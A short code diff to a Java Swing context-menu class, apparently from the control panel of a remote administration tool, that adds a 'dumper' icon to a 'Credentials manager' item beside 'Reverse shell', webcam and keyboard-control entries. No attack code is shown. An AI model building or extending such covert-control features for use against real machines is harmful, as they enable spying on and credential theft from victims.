@@ -95,6 +95,7 @@ public class TablePopUpListener extends MouseAdapter {
         setIconToMenuItem(webcamMenu, "webcam_icon.png");
         JMenuItem reverseShellMenu = new JMenuItem("Reverse shell");
         JMenuItem credentialsManagerMenu = new JMenuItem("Credentials manager");
+        setIconToMenuItem(credentialsManagerMenu,"dumper.png");
         setIconToMenuItem(reverseShellMenu, "shell_icon.png");
         JMenuItem keyboardController = new JMenuItem("Keyboard controller");
         setIconToMenuItem(keyboardController, "keyboard_icon.png");
